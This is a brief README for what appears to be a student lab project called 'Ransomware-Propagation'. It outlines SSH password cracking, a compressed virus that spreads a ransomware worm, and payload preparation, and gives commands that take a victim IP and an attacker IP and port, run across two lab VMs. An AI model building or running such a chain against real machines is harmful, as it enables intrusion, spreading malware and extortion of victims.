# Ransomware-Propagation
## Function
1. Crack SSH password
2. Create a compression virus with the propagation of the ransomware worm
3. Prepare the ransomware payload

Tools:
Automatic SSH and SFTP operation in Python: paramiko
Strings combination in Python: itertools

Usage:
Need two VM(Ubuntu 18 LTS)

Attacker VM:
$ ./crack_attack <Victim IP> <Attacker IP> <Attacker Port>
$ ./attacker_server <Attacker Port>

Victim VM:
Use the /home/csc2021/cat

  
